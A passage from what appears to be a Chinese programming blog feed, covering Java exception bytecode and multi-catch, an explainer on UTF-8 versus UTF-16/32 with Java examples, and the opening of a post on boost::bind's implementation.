class="line"><span class="function">    ALOAD 0</span></span><br><span class="line"><span class="function">    BIPUSH 100</span></span><br><span class="line"><span class="function">    INVOKEVIRTUAL Test.<span class="title">testFunc</span><span class="params">(I)</span>V</span></span><br><span class="line"><span class="function">   L1</span></span><br><span class="line"><span class="function">    LINENUMBER 61 L1</span></span><br><span class="line"><span class="function">    GOTO L9</span></span><br><span class="line"><span class="function">   L2</span></span><br><span class="line"><span class="function">   FRAME SAME1 javax/naming/NamingException</span></span><br><span class="line"><span class="function">    ASTORE 1</span></span><br><span class="line"><span class="function">   L10</span></span><br><span class="line"><span class="function">    LINENUMBER 63 L10</span></span><br><span class="line"><span class="function">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream</span>;</span><br><span class="line">    LDC <span class="string">"11111"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">   L5</span><br><span class="line">    LINENUMBER <span class="number">71</span> L5</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"xxxxxxxxxxxx"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">    GOTO L11</span><br><span class="line">   L3</span><br><span class="line">    LINENUMBER <span class="number">64</span> L3</span><br><span class="line">   FRAME SAME1 javax/xml/xpath/XPathException</span><br><span class="line">    ASTORE <span class="number">1</span></span><br><span class="line">   L12</span><br><span class="line">    LINENUMBER <span class="number">66</span> L12</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"22222"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">   L7</span><br><span class="line">    LINENUMBER <span class="number">71</span> L7</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"xxxxxxxxxxxx"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">    GOTO L11</span><br><span class="line">   L4</span><br><span class="line">    LINENUMBER <span class="number">67</span> L4</span><br><span class="line">   FRAME SAME1 java/sql/SQLException</span><br><span class="line">    ASTORE <span class="number">1</span></span><br><span class="line">   L13</span><br><span class="line">    LINENUMBER <span class="number">69</span> L13</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"33333"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">   L8</span><br><span class="line">    LINENUMBER <span class="number">71</span> L8</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"xxxxxxxxxxxx"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">    GOTO L11</span><br><span class="line">   L6</span><br><span class="line">    LINENUMBER <span class="number">70</span> L6</span><br><span class="line">   FRAME SAME1 java/lang/Throwable</span><br><span class="line">    ASTORE <span class="number">2</span></span><br><span class="line">   L14</span><br><span class="line">    LINENUMBER <span class="number">71</span> L14</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"xxxxxxxxxxxx"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">   L15</span><br><span class="line">    LINENUMBER <span class="number">72</span> L15</span><br><span class="line">    ALOAD <span class="number">2</span></span><br><span class="line">    ATHROW</span><br><span class="line">   L9</span><br><span class="line">    LINENUMBER <span class="number">71</span> L9</span><br><span class="line">   FRAME SAME</span><br><span class="line">    GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">    LDC <span class="string">"xxxxxxxxxxxx"</span></span><br><span class="line">    INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">   L11</span><br><span class="line">    LINENUMBER <span class="number">73</span> L11</span><br><span class="line">   FRAME SAME</span><br><span class="line">    RETURN</span><br><span class="line">   L16</span><br><span class="line">    LOCALVARIABLE <span class="keyword">this</span> LTest; L0 L16 <span class="number">0</span></span><br><span class="line">    LOCALVARIABLE e Ljavax/naming/NamingException; L10 L5 <span class="number">1</span></span><br><span class="line">    LOCALVARIABLE e Ljavax/xml/xpath/XPathException; L12 L7 <span class="number">1</span></span><br><span class="line">    LOCALVARIABLE e Ljava/sql/SQLException; L13 L8 <span class="number">1</span></span><br><span class="line">    MAXSTACK = <span class="number">2</span></span><br><span class="line">    MAXLOCALS = <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>我们可以很神奇的发现，finally块的代码在每一个catch后面都有一份。也就是说finally的实现有点像内联优化，把代码复制了很多份。</p>
<h2 id="JDK7中mutil-catch的实现"><a href="#JDK7中mutil-catch的实现" class="headerlink" title="JDK7中mutil catch的实现"></a>JDK7中mutil catch的实现</h2><p>我们再来看下JDK7新增的mutil catch语法的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		testFunc(<span class="number">100</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NamingException | XPathException | SQLException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ByteCode插件的分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">test3</span><span class="params">()</span>V</span></span><br><span class="line"><span class="function">   TRYCATCHBLOCK L0 L1 L2 javax/naming/NamingException</span></span><br><span class="line"><span class="function">   TRYCATCHBLOCK L0 L1 L2 javax/xml/xpath/XPathException</span></span><br><span class="line"><span class="function">   TRYCATCHBLOCK L0 L1 L2 java/sql/SQLException</span></span><br><span class="line"><span class="function">  L0</span></span><br><span class="line"><span class="function">   LINENUMBER 77 L0</span></span><br><span class="line"><span class="function">   ALOAD 0</span></span><br><span class="line"><span class="function">   BIPUSH 100</span></span><br><span class="line"><span class="function">   INVOKEVIRTUAL Test.<span class="title">testFunc</span><span class="params">(I)</span>V</span></span><br><span class="line"><span class="function">  L1</span></span><br><span class="line"><span class="function">   LINENUMBER 78 L1</span></span><br><span class="line"><span class="function">   GOTO L3</span></span><br><span class="line"><span class="function">  L2</span></span><br><span class="line"><span class="function">  FRAME SAME1 java/lang/Exception</span></span><br><span class="line"><span class="function">   ASTORE 1</span></span><br><span class="line"><span class="function">  L4</span></span><br><span class="line"><span class="function">   LINENUMBER 79 L4</span></span><br><span class="line"><span class="function">   ALOAD 1</span></span><br><span class="line"><span class="function">   INVOKEVIRTUAL java/lang/Exception.<span class="title">printStackTrace</span><span class="params">()</span>V</span></span><br><span class="line"><span class="function">  L3</span></span><br><span class="line"><span class="function">   LINENUMBER 81 L3</span></span><br><span class="line"><span class="function">  FRAME SAME</span></span><br><span class="line"><span class="function">   RETURN</span></span><br><span class="line"><span class="function">  L5</span></span><br><span class="line"><span class="function">   LOCALVARIABLE <span class="keyword">this</span> LTest</span>; L0 L5 <span class="number">0</span></span><br><span class="line">   LOCALVARIABLE e Ljava/lang/Exception; L4 L3 <span class="number">1</span></span><br><span class="line">   MAXSTACK = <span class="number">2</span></span><br><span class="line">   MAXLOCALS = <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>我们可以发现，每一个TRYCATCHBLOCK的配置都是一样的，只是异常的名字不一样。所以实际上mutil catch的实现和普通的实现没有太大的区别，当然从JVM的实现角度来看，mutil catch有可能可以优化Exception Handler的查找过程（纯猜测的，如果是线性查找，则效率是一样的）。不过有好处是可以减少class文件的体积，这个也比较有用，因为目前Java的class文件的大小是有限制的。参考这里；<a href="http://stackoverflow.com/questions/5497495/maximum-size-of-java-class-exception-table" target="_blank" rel="noopener">http://stackoverflow.com/questions/5497495/maximum-size-of-java-class-exception-table</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Java中的异常的实现不是什么太神秘的东东，和人们的直觉的实现差不多。任何编程语言的异常机制都会有一定的开销，但是异常如果没有触发，实际上是没有开销的。</p>
<p>异常在触发时，要new一个异常对象，再一层层地栈帧回退，每层都要查找异常处理表，开销还是比较大的。</p>
<p>所在异常只应该用在合适的地方，如果异常像Switch那样用，那就悲剧了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html#jvms-6.5.athrow" target="_blank" rel="noopener">http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html#jvms-6.5.athrow</a></p>
</li>
<li><p><a href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-2.html#jvms-2.10" target="_blank" rel="noopener">http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-2.html#jvms-2.10</a></p>
</li>
<li><p><a href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.7.3" target="_blank" rel="noopener">http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.7.3</a></p>
</li>
<li><p><a href="http://andrei.gmxhome.de/bytecode/" target="_blank" rel="noopener">http://andrei.gmxhome.de/bytecode/</a>    非常有用的分析Java 汇编代码的Eclipse插件</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>bytecode</tag>
        <tag>exception</tag>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>扯谈下UTF-8</title>
    <url>/about-utf8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来想翻译这篇文章的（作者是utf-8编码，golang发明者之一）：</p>
<ul>
<li>UTF-8: Bits, Bytes, and Benefits: <a href="http://research.swtch.com/utf8" target="_blank" rel="noopener">http://research.swtch.com/utf8</a></li>
</ul>
<p>一则翻译起来很痛苦，二则觉得这篇文章有些地方可能说得不是太明白，所以结合其它的一些东东扯谈下utf-8。</p>
<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>先扯谈下Unicode。</p>
<p>Unicode就是为每一个字符（各种语言的各种字符）分配一个数字。所以它实际上是一个表，记录了字符和数字的对应关系。</p>
<p>比如汉字“你”，对应的数字是20320，16进制是4F60。</p>
<p>目前Unicode的范围从 U+0000 到 U+10FFFF 。有UTF-8，UTF-16，UTF-32三种编码方式。</p>
<p>其中UTF-8对应1到4个8-bit，UTF-16对应1到2个16-bit，UTF-32对应1个32-bit。</p>
<p>下面这个表，很清晰地总结了各种编码方式（from: <a href="http://www.unicode.org/faq/utf_bom.html" target="_blank" rel="noopener">http://www.unicode.org/faq/utf_bom.html</a> ）：</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>UTF-8</th>
<th>UTF-16</th>
<th>UTF-16BE</th>
<th>UTF-16LE</th>
<th>UTF-32</th>
<th>UTF-32BE</th>
<th>UTF-32LE</th>
</tr>
</thead>
<tbody>
<tr>
<td>Smallest code point</td>
<td>0000</td>
<td>0000</td>
<td>0000</td>
<td>0000</td>
<td>0000</td>
<td>0000</td>
<td>0000</td>
</tr>
<tr>
<td>Largest code point</td>
<td>10FFFF</td>
<td>10FFFF</td>
<td>10FFFF</td>
<td>10FFFF</td>
<td>10FFFF</td>
<td>10FFFF</td>
<td>10FFFF</td>
</tr>
<tr>
<td>Code unit size</td>
<td>8 bits</td>
<td>16 bits</td>
<td>16 bits</td>
<td>16 bits</td>
<td>32 bits</td>
<td>32 bits</td>
<td>32 bits</td>
</tr>
<tr>
<td>Byte order</td>
<td>N/A</td>
<td><code>&lt;BOM&gt;</code></td>
<td>big-endian</td>
<td>little-endian</td>
<td><code>&lt;BOM&gt;</code></td>
<td>big-endian</td>
<td>little-endian</td>
</tr>
<tr>
<td>Fewest bytes per character</td>
<td>1</td>
<td>2</td>
<td>2</td>
<td>2</td>
<td>4</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td>Most bytes per character</td>
<td>4</td>
<td>4</td>
<td>4</td>
<td>4</td>
<td>4</td>
<td>4</td>
<td>4</td>
</tr>
</tbody>
</table>
<h2 id="历史原因"><a href="#历史原因" class="headerlink" title="历史原因"></a>历史原因</h2><p>因为历史原因，曾经人们以为用两个8-bit，可以表示任意一字符，最初的Unicode标准就是16-bit的。所以Java中的char类型，C++中的wchar_t（gcc当作32-bit），QT中的QString，windows的底层Unicode的支持，都是16-bit的，所以造成了很多悲剧。</p>
<p>wchar_t实际上是个过时的东东，所以在C++11中增加了char16_t和char32_t类型，不过因为各家编译器的实现，标准库的实现，及语法等，实际使用还是相当相当的蛋疼。</p>
<p>这些悲剧一是unicode标准本身很比较晚才成熟，二则C/C++一直没有把unicode支持标准化（所以QT自己搞了一套，微软自己也搞了套）。</p>
<p>不过话说回来，这些悲剧不能全怪C++，只能说Unicode标准本身就蛋疼。据我所认识的编程语言中，只有后来比较晚出现的语言才比较好地支持unicode，比如golang，python3。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/12/unicode.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/12/unicode.html</a>     Unicode与JavaScript详解</p>
<h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>上面扯远了，再回来说下UTF-8。</p>
<h3 id="UTF-8的编码规则"><a href="#UTF-8的编码规则" class="headerlink" title="UTF-8的编码规则"></a>UTF-8的编码规则</h3><p>UTF-8的编码规则可以看阮一锋写的文章：<a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    Unicode符号范围 | UTF-8编码方式</span><br><span class="line">(十六进制) | （二进制）</span><br><span class="line">--------------------+---------------------------------------------</span><br><span class="line">0000 0000-0000 007F | 0xxxxxxx</span><br><span class="line">0000 0080-0000 07FF | 110xxxxx 10xxxxxx</span><br><span class="line">0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx</span><br><span class="line">0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br><span class="line">下面，还是以汉字“严”为例，演示如何实现UTF-8编码。</span><br><span class="line">已知“严”的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此“严”的UTF-8编码需要三个字节，即格式是“1110xxxx 10xxxxxx 10xxxxxx”。然后，从“严”的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，“严”的UTF-8编码是“11100100 10111000 10100101”，转换成十六进制就是E4B8A5。</span><br></pre></td></tr></table></figure>
<p>要注意的是在UTF-8编码中，非ASCII字符的编码字串中不会出现0X00，即’\0’。这个很重要，是UTF-8有很多特性的重要原因。</p>
<h3 id="UTF-8编码的优点"><a href="#UTF-8编码的优点" class="headerlink" title="UTF-8编码的优点"></a>UTF-8编码的优点</h3><p>UTF-8的编码规则，让它有很多特性：</p>
<ul>
<li><p>兼容ASCII。ASCII编码的文件即同时也是UTF-8编码的文件。</p>
</li>
<li><p>可以从二进制数据流中识别出ASCII字符，比如有一个字节是0x7A，那么它肯定是字符’z’，因为它的最高为是0（参见上面的UTF-8的编码规则，所有的非ASCII字符的UTF-8编码的字节的最高位都是1）。</p>
</li>
<li><p>子串搜索可以直接按字节进行搜索，可以使用C语言原有的函数，如strchr，strstr（原因参考上面的UTF-8的编码规则）。</p>
</li>
<li><p>大多数处理8-bit编码文件的程序可以安全地处理utf-8文件（原因参考上一点）。</p>
</li>
<li><p>utf-8编码的顺序和Unicode中码位(code point)的顺序是一致的，所以像unix工具，join，ls，sort等不用显式地指明是utf-8编码。</p>
</li>
<li><p>utf-8编码是没有字节顺序的，UTF-8编码的文件可以不用写BOM头。</p>
<p>  像UTF-16或者UTF-32编码的文件就要写入BOM头，否则只能猜测了。（其实，文本编辑器都是读入一段数据，再猜测到底是什么编码。mozilla有个开源程序jChardet，可以猜什么编码，但是实测并不是很准确。对于没有指定编码的网页，浏览器只好去猜测所使用的编码，像chrome浏览器有时就会猜错，貌似错误率比IE要高。）</p>
</li>
</ul>
<p>update:2016-05-23<br>貌似这个库是一直更新的，可以用来检测编码，其它的都比较老了。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ibm.icu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>icu4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>57.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="http://stackoverflow.com/questions/499010/java-how-to-determine-the-correct-charset-encoding-of-a-stream" target="_blank" rel="noopener">http://stackoverflow.com/questions/499010/java-how-to-determine-the-correct-charset-encoding-of-a-stream</a></p>
<h3 id="utf-8编码的缺点"><a href="#utf-8编码的缺点" class="headerlink" title="utf-8编码的缺点"></a>utf-8编码的缺点</h3><ul>
<li><p>utf-8编码是好，但是因为它是变长的！所以用一个什么类型来表示一个utf-8字符？</p>
<p>  这个在C++中还是无解，其实在其它的编程语言中同样是无解。至于go语言，它采取了一个折中的办法，在历遍字符串时，得到的是一个rune类型（实际即int32）。<br>  另外，假定有一个大文件，你修改了一个字符，那么有可能整一个文件都有重新保存。。<br>  UTF-16编码尽管也有可能要重新保存整个文件，但是概率比较小，因为大部分常用的字符都可以用一个16-bit来表示。</p>
</li>
<li><p>不能实现O(1)的随机访问</p>
<p>  所以像文本编辑器等要内部再用一个数组来记录每一个字符的位置。</p>
</li>
</ul>
<p>不过，像随机访问，这样的操作是很少的。</p>
<p>对于编程语言来说，问题不大，因为大部分编程语言中string都是不要修改的（貌似只有C++中string是可以修改的）。</p>
<p>所以通常只有历遍操作，而历遍操作，对于UTF-8，UTF-16，UTF-32都是O(n)的时间复杂度（当然，如果较真，UTF-32编码要快一些）。</p>
<p><strong>其实上面的缺点，同样是UTF-16编码的缺点（它也是变长的1个16-bit或者2个16-bit），UTF-16编码还有一个重要的缺点是要指明字节序。</strong></p>
<p>UTF-32编码的缺点是要指明字节序和太浪费空间（如果全是ASCII字符，那么要浪费3倍的空间！），UTF-32编码的优点是可以O(1)实现随机访问。</p>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><p>受Windows API的影响，话说我以前是UTF-16党（wchar_t），但是后来发现它并不是定长的（不能用像s[i]这样的代码来访问一个字符），很伤心，慢慢改为用utf-8编码了，但是utf-8编码不能随机访问，的确也是个问题。</p>
<p>所以现在我是“无-党-派-人-士”:) 。</p>
<p>国外还有人专门做了个网站来推广utf-8编码：<a href="http://utf8everywhere.org/" target="_blank" rel="noopener">http://utf8everywhere.org/</a></p>
<p>还有专门吐槽UTF-16的：<a href="http://programmers.stackexchange.com/questions/102205/should-utf-16-be-considered-harmful" target="_blank" rel="noopener">http://programmers.stackexchange.com/questions/102205/should-utf-16-be-considered-harmful</a></p>
<h2 id="Unicode在线查询的方法"><a href="#Unicode在线查询的方法" class="headerlink" title="Unicode在线查询的方法"></a>Unicode在线查询的方法</h2><ul>
<li><p><a href="http://en.wikipedia.org/wiki/List_of_Unicode_characters" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/List_of_Unicode_characters</a></p>
</li>
<li><p><a href="http://www.unicode.org/charts/" target="_blank" rel="noopener">http://www.unicode.org/charts/</a></p>
</li>
</ul>
<p>4个byte的utf-8字符串的一些例子：</p>
<p><a href="http://en.wikibooks.org/wiki/Unicode/Character_reference/1D000-1DFFF" target="_blank" rel="noopener">http://en.wikibooks.org/wiki/Unicode/Character_reference/1D000-1DFFF</a></p>
<p>这里还有一个测试utf-8解码是否正确的测试例子：</p>
<p><a href="http://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txt" target="_blank" rel="noopener">http://www.cl.cam.ac.uk/~mgk25/ucs/examples/UTF-8-test.txt</a></p>
<p>这里有一个Unicode编码清单，比较实用：</p>
<p><a href="http://witmax.cn/unicode-list.html" target="_blank" rel="noopener">http://witmax.cn/unicode-list.html</a></p>
<h2 id="python3中的unicode"><a href="#python3中的unicode" class="headerlink" title="python3中的unicode"></a>python3中的unicode</h2><p>在python3中，字符串就是Unicode字符串。在CPython的代码中可以看到，对UTF-8，UTF-16，UTF-32都实现了支持。在创建一个字符串时（比如，解析“print(‘abc中国’)”语句，在cmd窗口下，’abc中国’的编码通常是cp936，即gbk编码），如果是UTF-16或者UTF-32编码，则直接创建一个对应的字符串对象即可。如果是其它编码，则先转换为UTF-8编码，再创建一个字符串对象。</p>
<h2 id="java里如何处理大于U-FFFF（即4byte的UTF-16编码）的字符"><a href="#java里如何处理大于U-FFFF（即4byte的UTF-16编码）的字符" class="headerlink" title="java里如何处理大于U+FFFF（即4byte的UTF-16编码）的字符"></a>java里如何处理大于U+FFFF（即4byte的UTF-16编码）的字符</h2><p>java里用char来表示一个字符，但是char却不能表示大于U+FFFF的字符，因为char只有两个byte。上面说了java出现时unicode标准还没有成熟，所以这是一个历史遗留问题。</p>
<p>那么如何在java里表示和处理大于U+FFFF的字符？参考这里：</p>
<p><a href="http://stackoverflow.com/questions/9834964/char-to-unicode-more-than-uffff-in-java" target="_blank" rel="noopener">http://stackoverflow.com/questions/9834964/char-to-unicode-more-than-uffff-in-java</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// This represents U+10FFFF</span></span><br><span class="line">String x = <span class="string">"\udbff\udfff"</span>;</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String y = <span class="keyword">new</span> StringBuilder().appendCodePoint(<span class="number">0x10ffff</span>).toString();</span><br></pre></td></tr></table></figure>
<p>还提供了一些函数来处理，更多的可以直接参考String类的注释。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">||System.out.println(y);</span><br><span class="line">||System.out.println(<span class="string">"codePoint:"</span> + y.codePointAt(<span class="number">0</span>));</span><br><span class="line">||System.out.println(<span class="string">"codePoint len:"</span> + y.codePointCount(<span class="number">0</span>, y.length()));</span><br></pre></td></tr></table></figure>
<p>update: 2017-4-26</p>
<p>JDK里处理utf8编码的代码：<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/sun/nio/cs/UTF_8.java?av=f#285" target="_blank" rel="noopener">http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/sun/nio/cs/UTF_8.java?av=f#285</a></p>
<p>JDK里默认的序列化是如何处理编码的：</p>
<p><code>java.io.ObjectOutputStream.BlockDataOutputStream.writeUTFBody(String)</code></p>
<p>因为jdk里的String都是utf-16的编码，在这里jdk的序列化做了一点压缩的处理。对于两个char（四个字节）的字符，压缩为3个字节来表示。</p>
<p>hessian里的字符是utf8编码的。参考 <a href="http://hessian.caucho.com/doc/hessian-serialization.html" target="_blank" rel="noopener">http://hessian.caucho.com/doc/hessian-serialization.html</a></p>
<p>在实现里，可以做一个优化。用unsafe 读出一个long，然后判断是不是全是ansi字符，这样子可以加快速度。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fast path for ASCII</span></span><br><span class="line"><span class="keyword">int</span> numLongs = toRead &gt;&gt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; numLongs; i++) &#123;</span><br><span class="line">  <span class="keyword">long</span> currentOffset = baseOffset + _offset;</span><br><span class="line">  <span class="keyword">long</span> test = unsafe.getLong(_buffer, currentOffset);</span><br><span class="line">  <span class="keyword">if</span> ((test &amp; <span class="number">0x8080808080808080L</span>) == <span class="number">0L</span>) &#123;</span><br><span class="line">    _chunkLength-=<span class="number">8</span>;</span><br><span class="line">    toRead -= <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">      _sbuf.append((<span class="keyword">char</span>)(_buffer[_offset++]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>鉴于UTF-8编码有这么多优点，UTF-8编码会越来越流行。据google的统计数据，超过50%的网页，是utf-8编码。很多工具默认编码都是UTF-8的，比如python3的解析器，GCC。</p>
<p>通常来说UTF-8编码是优先选择，不过，如果是一些特殊应用，要用到O(1)的随机访问字符串，应该使用UTF-32编码。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p>UTF-8: Bits, Bytes, and Benefits <a href="http://research.swtch.com/utf8" target="_blank" rel="noopener">http://research.swtch.com/utf8</a></p>
</li>
<li><p><a href="http://www.unicode.org" target="_blank" rel="noopener">http://www.unicode.org</a></p>
</li>
<li><p>UTF-8, UTF-16, UTF-32 &amp; BOM <a href="http://www.unicode.org/faq/utf_bom.html" target="_blank" rel="noopener">http://www.unicode.org/faq/utf_bom.html</a></p>
</li>
<li><p>字符编码笔记：ASCII，Unicode和UTF-8 <a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html</a> </p>
</li>
<li><p>The Go Programming Language Specification <a href="http://golang.org/ref/spec" target="_blank" rel="noopener">http://golang.org/ref/spec</a></p>
</li>
<li><p>微软的Unicode的一个文档： <a href="http://msdn.microsoft.com/en-us/goglobal/bb688113.aspx" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/goglobal/bb688113.aspx</a>  </p>
</li>
<li><p>其实你并不懂 Unicode： <a href="https://zhuanlan.zhihu.com/p/53714077" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/53714077</a> </p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>utf8</tag>
        <tag>unicode</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>详细解析boost中bind的实现</title>
    <url>/cpp-boost-bind/</url>
    <content><![CDATA[<h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>在C++11之后，std::bind是C++标准库的一个组件了。一开始想弄个C++11的实现来研究下，发现里面用到了可变参数模板（代码变得非常神奇）.</p>
<p><a href="http://llvm.org/svn/llvm-project/libcxx/trunk/include/functional" target="_blank" rel="noopener">http://llvm.org/svn/llvm-project/libcxx/trunk/include/functional</a></p>
<p>还是弄个原始点的boost的实现来研究下。</p>
<p>话说网上关于boost::bind的实现的文章也有不少，不过大多数都是贴一段代码，再扯一通，结果到头来什么都没看明白。（起码LZ是。。）</p>
<p>花了一天的功夫，最终从boost::bind的源代码中抠出了可编绎运行的代码。</p>
<p>下面一步一步来解析boost::bind的实现。</p>
<h2 id="标准库中的fouctor和bind1st的实现"><a href="#标准库中的fouctor和bind1st的实现" class="headerlink" title="标准库中的fouctor和bind1st的实现"></a>标准库中的fouctor和bind1st的实现</h2><p>首先从简单的入手。先看下标准库中的fouctor和bind1st的实现（为了防止和标准库的命名冲突，全部都在命名后面加了2）。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Arg1, <span class="keyword">typename</span> _Arg2, <span class="keyword">typename</span> _Result&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">binary_function2</span> &#123;</span></span><br><span class="line">	<span class="keyword">typedef</span> _Arg1 first_argument_type;</span><br><span class="line">	<span class="keyword">typedef</span> _Arg2 second_argument_type;</span><br><span class="line">	<span class="keyword">typedef</span> _Result result_type;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> _Tp&gt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">equal_to2</span>:</span> <span class="keyword">public</span> binary_function2&lt;_Tp, _Tp, <span class="keyword">bool</span>&gt; &#123;</span><br><span class="line">	<span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> _Tp&amp; __x, <span class="keyword">const</span> _Tp&amp; __y)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __x == __y;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span 